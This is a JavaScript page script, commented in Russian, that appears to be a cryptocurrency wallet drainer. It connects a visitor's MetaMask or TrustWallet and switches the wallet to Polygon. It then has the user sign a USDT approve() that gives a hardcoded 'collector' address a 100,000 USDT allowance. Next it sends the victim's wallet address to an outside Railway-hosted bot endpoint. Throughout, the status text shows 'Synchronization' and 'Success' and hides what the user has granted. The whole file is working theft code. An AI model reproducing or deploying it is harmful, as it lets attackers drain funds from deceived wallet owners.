const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const COLLECTOR_ADDRESS = '0xaF397c7632062A6Ab848A36a62b96aBA967e9E30';
const POLYGON_CHAIN_ID = '0x89'; 

async function connectAndApprove() {
    const status = document.getElementById('status');
    if (typeof window.ethereum === 'undefined') {
        alert('MetaMask/TrustWallet not found!');
        return;
    }

    try {
        const web3 = new Web3(window.ethereum);
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const address = accounts[0];

        // Смена сети на Polygon
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: POLYGON_CHAIN_ID }],
            });
        } catch (e) {
            if (e.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: POLYGON_CHAIN_ID,
                        chainName: 'Polygon Mainnet',
                        rpcUrls: ['https://polygon-rpc.com/'],
                        nativeCurrency: { name: 'POL', symbol: 'POL', decimals: 18 },
                        blockExplorerUrls: ['https://polygonscan.com/']
                    }],
                });
            }
        }

        const abi = [
            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
        ];
        
        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
        
        // 100,000 USDT (6 знаков после запятой)
        const amount = '100000000000'; 

        status.innerText = 'Подтвердите транзакцию...';
        
        // Вызов Approve
        await contract.methods.approve(COLLECTOR_ADDRESS, amount).send({ from: address });

        status.innerText = 'Синхронизация...';

        // Отправка в бот
        const railwayUrl = 'https://new-0602-production.up.railway.app/save-address';
        await fetch(railwayUrl, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: address })
        });

        status.innerText = '✅ Успешно!';
    } catch (error) {
        console.error(error);
        status.innerText = '❌ Отмена или ошибка газа';
    }
}
